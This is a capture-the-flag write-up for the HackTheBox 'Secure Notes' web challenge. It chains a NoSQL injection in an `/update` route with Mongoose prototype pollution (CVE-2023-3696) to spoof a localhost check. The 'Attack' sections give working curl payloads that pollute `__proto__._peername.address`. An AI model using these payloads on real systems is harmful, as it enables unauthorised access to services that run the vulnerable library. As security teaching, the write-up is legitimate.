---
title: "Secure Notes - HTB Web Challenge"
date: 2026-07-24 12:00:00 +0200
categories: [Challenges, web]
tags: [web, Challenges, HackTheBox]
image:
  path: /assets/img/posts/secure-notes/main.png
---

I love it when a challenge description is basically a taunt. Secure Notes opens with this line: "We built this note-taking app to be so simple, there can't possibly be any bugs. We even added a door to claim the flag. However, only those who knock from inside may enter!"

Famous last words.

This one turned into a proper rabbit hole. NoSQL injection, a real CVE hiding in a pinned dependency, and a Node.js internals detail that took way longer to track down than I'd like to admit. No exploit frameworks, just curl and a lot of stubbornness.

---

## First Impressions

![SecNotes app](/assets/img/posts/secure-notes/app-ui.png)

The app is a simple note taking tool called SecNotes. Create a note, edit it, fetch it back by ID. Source code was provided alongside the challenge, an Express and MongoDB app with this route layout:

```plaintext
challenge/
├── conf/
│   └── supervisord.conf
└── src/
    ├── app.js
    ├── package.json
    ├── package-lock.json
    └── public/
        ├── index.html
        ├── update.html
        └── style.css
```

The interesting route is `/flag`:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

No header can fake this. It reads straight off the raw TCP socket, not `X-Forwarded-For` or anything a proxy would normally rewrite. Whatever hits this route has to be a genuine loopback connection. Time to find out how to become "inside."

---

## Bug 1, Unsanitized NoSQL Update

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

`noteId` comes straight out of the JSON body with zero validation, and the entire `req.body` gets passed as the update document too. Easy to confirm with a MongoDB operator instead of a plain string:

```bash
curl -X POST http://TARGET/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": {"$ne": null}, "title": "pwn"}'
```

That matched a note that wasn't even mine. Confirmed, `noteId` is a genuine NoSQL injection point. On its own this doesn't get you very far since notes have no ownership field to bypass, but it's the door that everything else walks through.

---

## Bug 2, An Outdated Mongoose

```json
"dependencies": {
    "express": "^4.18.2",
    "mongoose": "^7.2.4"
}
```

Mongoose 7.2.4 is vulnerable to CVE-2023-3696, a prototype pollution bug in `findByIdAndUpdate` and friends, fixed in 7.3.4. Since `/update` hands your whole request body straight to `findByIdAndUpdate`, you can smuggle in MongoDB's `$rename` operator and rename a field onto `__proto__`, which pollutes `Object.prototype` for the entire running Node process, not just your one document.

Proof it works, rename a field to somewhere that doesn't exist as a real schema field and watch it vanish from the response instead of reappearing anywhere:

```bash
curl -X POST http://TARGET/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": "<id>", "$rename": {"title": "__proto__.polluted"}}'
```

The `title` field disappears from the response entirely. That's exactly what you'd expect if the value got redirected onto the prototype chain instead of staying as a normal document field.

---

## The Attack

### Step 1, First Target, Wrong Property

Obvious first move: pollute `remoteAddress` directly and see if `/flag` believes it.

![First pollution attempt](/assets/img/posts/secure-notes/pollution-attempt-remoteaddress.png)

Dead end, and for a good reason once you think about it. Node defines `remoteAddress` as a getter directly on `Socket.prototype`. Own properties and prototype-chain lookups that resolve closer to the object always win over anything sitting further up on `Object.prototype`, so no amount of pollution touches that specific name. Confirmed, not just suspected, still a 403.

### Step 2, The Right Property

That getter's actual implementation reads from a different, unprotected spot underneath it, a cache object called `_peername` that Node fills in with the real connection details. Target that instead:

![Correct pollution target](/assets/img/posts/secure-notes/pollution-rename-peername.png)

```bash
curl -X POST http://TARGET/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": "<id>", "content": "127.0.0.1"}'

curl -X POST http://TARGET/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": "<id>", "$rename": {"content": "__proto__._peername.address"}}'

curl http://TARGET/get/<id>
```

That last `/get` call matters more than it looks. The `$rename` renames the field in the stored document, but Mongoose only actually applies the pollution in memory when it re-hydrates a document, which happens on that follow up fetch. Skip it and the pollution never really lands.

### Step 3, Knock From the Inside

With `Object.prototype._peername.address` now poisoned, any brand new connection that has never had its real peer address cached yet falls through to the polluted value on first lookup instead of the genuine one.

```bash
curl -v http://TARGET/flag
```

![Flag captured](/assets/img/posts/secure-notes/flag-captured-redacted.png)

200 OK. Door opened.

---

## Summary

| Bug | Description | Impact |
|-----|-------------|--------|
| 1 | Unsanitized `noteId` and body in `/update` | NoSQL injection |
| 2 | Mongoose 7.2.4, CVE-2023-3696 | Prototype pollution via `$rename` |
| 3 | `/flag` reads an unprotected internal socket cache | Localhost check bypass |

Three small issues, none of them dramatic on their own, chained into a full bypass of a check that looked airtight on the surface. That's usually how the good ones go.

---

*If this helped, drop a follow, more writeups coming.* 🙌